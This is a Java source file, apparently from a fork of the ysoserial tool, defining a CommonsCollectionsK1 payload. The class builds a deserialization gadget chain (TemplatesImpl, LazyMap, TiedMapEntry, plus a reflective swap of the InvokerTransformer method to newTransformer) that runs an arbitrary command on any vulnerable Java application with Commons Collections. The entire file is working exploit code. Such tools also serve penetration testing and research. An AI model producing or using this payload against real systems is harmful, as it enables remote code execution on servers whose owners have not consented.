package ysoserial.payloads;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.HashMap;
import java.util.Map;

/**
 * created by 0x22cb7139 on 2021/8/18
 */
public class CommonsCollectionsK1 extends PayloadRunner implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        InvokerTransformer transformer = new InvokerTransformer("toString",new Class[0],new Object[0]);

        HashMap<String,String> innerMap = new HashMap<String,String>();
        Map m = LazyMap.decorate(innerMap,transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m,templates);
        outerMap.put(tied,"t");
        innerMap.clear();
        Reflections.setFieldValue(transformer,"iMethodName","newTransformer");
        return outerMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsK1.class,args);
    }
}
